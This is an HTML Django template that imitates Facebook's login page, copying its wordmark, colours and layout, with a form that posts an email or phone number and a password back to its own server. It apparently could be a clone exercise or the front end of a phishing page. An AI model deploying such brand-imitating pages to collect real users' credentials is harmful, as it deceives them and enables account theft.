<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            text-align: center;
            margin-bottom: 20px;
        }

        .container h1 {
            color: #1877f2;
            font-size: 50px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .container p {
            font-size: 18px;
            color: #606770;
        }

        .login-box {
            background: white;
            padding: 20px;
            width: 350px;
            border-radius: 8px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            background-color: #1877f2;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
        }

        .login-box button:hover {
            background-color: #166fe5;
        }

        .error {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        .signup-link {
            display: block;
            margin-top: 15px;
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>facebook</h1>
    </div>

    <div class="login-box">
        <form method="post">
            {% csrf_token %}
            <input type="text" name="email_or_phone" placeholder="Email or Phone Number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            
            {% if error %}
                <p class="error">{{ error }}</p>
            {% endif %}
        </form>

        <a href="#" class="signup-link">Create New Account</a>
    </div>

</body>
</html>
